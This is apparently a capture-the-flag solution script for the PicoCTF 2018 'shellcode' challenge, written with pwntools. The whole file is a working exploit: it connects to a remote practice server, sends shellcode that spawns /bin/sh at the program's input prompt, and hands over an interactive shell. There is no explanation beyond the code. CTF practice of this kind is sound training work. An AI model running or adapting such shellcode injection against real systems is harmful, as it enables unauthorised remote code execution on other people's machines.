from pwn import *
context(os='linux', arch='i386', log_level='debug')

# io = process('PicoCTF_2018_shellcode')
io = remote('node4.buuoj.cn',27516)
payload = asm(shellcraft.sh())
io.sendlineafter(b'Enter a string!',payload)
io.interactive()